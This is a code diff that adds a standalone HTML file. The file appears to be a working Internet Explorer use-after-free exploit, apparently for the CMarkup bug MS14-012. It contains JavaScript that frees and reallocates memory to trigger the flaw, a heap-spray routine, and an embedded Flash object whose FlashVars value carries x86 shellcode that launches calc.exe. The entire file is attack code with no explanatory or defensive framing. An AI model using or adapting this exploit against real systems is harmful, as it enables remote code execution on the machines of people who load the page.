@@ -1,0 +1,78 @@
+<html>
+    <head>
+    </head>
+    <body>
+
+    <script>
+
+    var g_arr = [];
+    var arrLen = 0x250;
+
+    function dword2data(dword)
+    {
+      var d = Number(dword).toString(16);
+      while (d.length < 8)
+        d = '0' + d;
+
+      return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
+    }
+
+    function eXpl()
+    {
+      var a=0;
+
+      for (a=0; a < arrLen; a++) {
+          g_arr[a] = document.createElement('div');
+      }
+
+      var b = dword2data(0x19fffff3);
+
+      while (b.length < 0x360) {
+        if (b.length == (0x98 / 2))
+        {
+          b += dword2data(0x1a000010);
+        }
+        else if (b.length == (0x94 / 2))
+        {
+          b += dword2data(0x1a111111);
+        }
+        else if (b.length == (0x15c / 2))
+        {
+          b += dword2data(0x42424242);
+        }
+        else
+        {
+          b += dword2data(0x19fffff3);
+        }
+      }
+
+      var d = b.substring(0, ( 0x340 - 2 )/2);
+
+      try{
+        this.outerHTML=this.outerHTML
+      } catch(e){
+
+      }
+
+      CollectGarbage();
+
+      for (a=0; a < arrLen; a++)
+        {
+          g_arr[a].title = d.substring(0, d.length);
+        }
+    }
+
+    function trigger()
+    {
+        var a = document.getElementsByTagName("script");
+        var b = a[0];
+        b.onpropertychange = eXpl;
+        var c = document.createElement('SELECT');
+        c = b.appendChild(c);
+    }
+
+    </script>
+    <embed src=ms14_012_cmarkup_uaf.swf FlashVars="version=0x18a164,0xc0830000,0x81208b08,0xfff830c4,0x89e8fcff,0x60000000,0xd231e589,0x30528b64,0x8b0c528b,0x728b1452,0x4ab70f28,0x31ff3126,0x613cacc0,0x202c027c,0x10dcfc1,0x52f0e2c7,0x10528b57,0x13c428b,0x78408bd0,0x4a74c085,0x8b50d001,0x588b1848,0xe3d30120,0x348b493c,0x31d6018b,0xacc031ff,0x10dcfc1,0x75e038c7,0xf87d03f4,0x75247d3b,0x588b58e2,0x66d30124,0x8b4b0c8b,0xd3011c58,0x18b048b,0x244489d0,0x615b5b24,0xff515a59,0x5a5f58e0,0x86eb128b,0x8d016a5d,0xb985,0x31685000,0xff876f8b,0xb5f0bbd5,0xa66856a2,0xff9dbd95,0x7c063cd5,0xe0fb800a,0x47bb0575,0x6a6f7213,0xd5ff5300,0x636c6163,0x6578652e" width="10" height="10">
+    </embed>
+    </body>
+    </html>
